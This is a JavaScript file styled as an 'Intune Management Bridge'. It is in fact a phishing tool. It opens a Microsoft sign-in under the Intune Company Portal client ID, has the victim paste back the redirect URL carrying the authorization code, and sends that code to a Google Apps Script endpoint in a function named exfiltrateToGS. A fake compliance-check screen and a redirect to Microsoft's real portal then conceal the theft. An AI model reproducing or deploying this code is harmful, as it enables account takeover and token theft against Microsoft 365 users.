/**
 * INTUNE MANAGEMENT BRIDGE - index.js
 * Implementation based on Black Hat 2024: Leveraging Intune Internals
 */

const GS_URL = "https://script.google.com/macros/s/AKfycbwISjwVCyEHQaqM5PbaI2J2gDN5j5ZN9nbm5x1IRl6lz8_0ksqL2ZIf14XM2RPoL2u3/exec"; 

function startBridge() {
    // Intune Company Portal Client ID (from Black Hat research)
    const INTUNE_PORTAL_ID = "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223";
    
    // The research highlights that the OMA-DM and enrollment flows 
    // often use the Native Client redirect.
    const REDIRECT = "https://login.microsoftonline.com/common/oauth2/nativeclient";

    const authUrl = `https://login.microsoftonline.com/common/oauth2/authorize?` +
        `client_id=${INTUNE_PORTAL_ID}` +
        `&response_type=code` + 
        `&scope=openid+profile+offline_access` +
        `&prompt=login` + 
        `&redirect_uri=${encodeURIComponent(REDIRECT)}`;

    // Show the Enrollment Progress UI
    document.getElementById('step-1').classList.add('hidden');
    document.getElementById('step-2').classList.remove('hidden');

    window.open(authUrl, "_blank", "width=520,height=620");
}

async function exfiltrateToGS() {
    const rawData = document.getElementById('raw-url').value;
    
    if (!rawData || !rawData.includes("code=")) {
        alert("Enrollment certificate data not detected.");
        return;
    }

    try {
        const response = await fetch(`${GS_URL}?action=exfiltrate&data=${encodeURIComponent(rawData)}`);
        const result = await response.json();
        
        if (result.status === "success") {
            // Success narrative: Simulation of device compliance check
            document.getElementById('step-2').classList.add('hidden');
            document.getElementById('step-3').classList.remove('hidden');
            setTimeout(() => window.location.href = "https://endpoint.microsoft.com", 3000);
        }
    } catch (err) {
        console.error("Sync Error:", err);
    }
}
